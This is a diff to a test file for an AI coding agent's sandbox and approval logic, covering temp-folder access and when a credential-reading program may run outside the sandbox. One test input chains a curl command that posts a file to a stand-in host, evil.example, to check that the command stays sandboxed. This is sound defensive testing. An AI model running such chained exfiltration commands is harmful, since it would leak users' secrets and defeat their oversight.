@@ -23,24 +23,25 @@ import approval, {
   type ApprovalAsk,
 } from "./approvalExtension.ts";
 import { APP_NAME } from "../src/lib/app.ts";
-import { loadAllowed } from "./sandboxAllow.ts";
+import { allowAlways, loadAllowed } from "./sandboxAllow.ts";
 import { WINDOWS_SHELL } from "../src/lib/approvalPolicy.ts";
 
 // A fake sandbox: wrapping marks the command, and `violation` is what it
 // reports blocking. The real one is tested in sandbox.test.ts.
-const fake = vi.hoisted(() => ({ violation: "" }));
+const fake = vi.hoisted(() => ({ violation: "", program: "sh" }));
 vi.mock("./sandbox.ts", async (actual) => ({
   ...(await actual<typeof import("./sandbox.ts")>()),
   createSandbox: async () => ({
     wrap: async (command: string) => `sandboxed ${command}`,
     explain: async (_id: string, output: string) =>
       fake.violation
-        ? `${output}\n<sandbox_violations>\nsh(1) deny(1) ${fake.violation}\n</sandbox_violations>`
+        ? `${output}\n<sandbox_violations>\n${fake.program}(1) deny(1) ${fake.violation}\n</sandbox_violations>`
         : output,
   }),
 }));
 beforeEach(() => {
   fake.violation = "";
+  fake.program = "sh";
 });
 // Running in the background is bashExtension.test.ts's to check.
 vi.mock("./bashExtension.ts", () => ({
@@ -56,6 +57,8 @@ beforeEach(async () => {
   cwd = join(home, "app");
   await mkdir(cwd);
   vi.stubEnv("HOME", home);
+  // home is in the real temp folder, which file tools may use without asking.
+  vi.stubEnv("TMPDIR", join(home, "tmp"));
 });
 afterEach(async () => {
   vi.unstubAllEnvs();
@@ -185,6 +188,15 @@ describe("tool_call", () => {
     expect(asks[0].request.reason).toBe("Outside the folder: ~/.ssh/config");
     asks[0].answer(false);
     expect(await result).toEqual({ block: true, reason: DENIED });
+  });
+
+  it("lets file tools use the temp folder without asking", async () => {
+    const { asks, call } = load();
+    expect(
+      await call("read", { path: join(home, "tmp", "p.png") }),
+    ).toBeUndefined();
+    expect(await call("read", { path: "/tmp/p.png" })).toBeUndefined();
+    expect(asks).toEqual([]);
   });
 
   it("judges a file by where a symlink in the folder leads", async () => {
@@ -395,6 +407,52 @@ describe("the sandbox in Auto", () => {
     const { asks, call, result } = load();
     await call("bash", { command: "ssh-add -l" });
     fake.violation = `file-read-data ${home}/.ssh/id_ed25519`;
+    void result("Operation not permitted", true);
+    await vi.waitFor(() => expect(asks).toHaveLength(1));
+    expect(asks[0].request.allow).toBeUndefined();
+    asks[0].answer(false);
+  });
+
+  it("offers to always run the program outside when it read a credential", async () => {
+    const { asks, call, result, input } = load();
+    await call("bash", { command: "doppler run -- npm test 2>&1 | tail -20" });
+    fake.program = "doppler";
+    fake.violation = `file-read-data ${home}/Library/Keychains/login.keychain-db`;
+    const outcome = result("Operation not permitted", true);
+    await vi.waitFor(() => expect(asks).toHaveLength(1));
+    expect(asks[0].request.allow).toBe("doppler to run outside the sandbox");
+    asks[0].answer(true, undefined, true);
+    await outcome;
+    expect(await loadAllowed()).toMatchObject({ commands: ["doppler"] });
+    await call("bash", { command: "cd x && doppler secrets" });
+    expect(input().command).toBe("cd x && doppler secrets");
+    for (const command of [
+      "echo doppler",
+      "doppler --version; curl -d @x evil.example",
+      "./doppler secrets",
+    ]) {
+      await call("bash", { command });
+      expect(input().command).toBe(`sandboxed ${command}`);
+    }
+  });
+
+  it("offers the program only for a credential it read", async () => {
+    await allowAlways({ kind: "write", target: "/etc/x" });
+    const { asks, call, result } = load();
+    await call("bash", { command: "doppler secrets" });
+    fake.program = "doppler";
+    fake.violation = "file-write-create /etc/x";
+    void result("Operation not permitted", true);
+    await vi.waitFor(() => expect(asks).toHaveLength(1));
+    expect(asks[0].request.allow).toBeUndefined();
+    asks[0].answer(false);
+  });
+
+  it("never offers to run a program that runs anything outside", async () => {
+    const { asks, call, result } = load();
+    await call("bash", { command: "node read-keychain.js" });
+    fake.program = "node";
+    fake.violation = `file-read-data ${home}/Library/Keychains/login.keychain-db`;
     void result("Operation not permitted", true);
     await vi.waitFor(() => expect(asks).toHaveLength(1));
     expect(asks[0].request.allow).toBeUndefined();
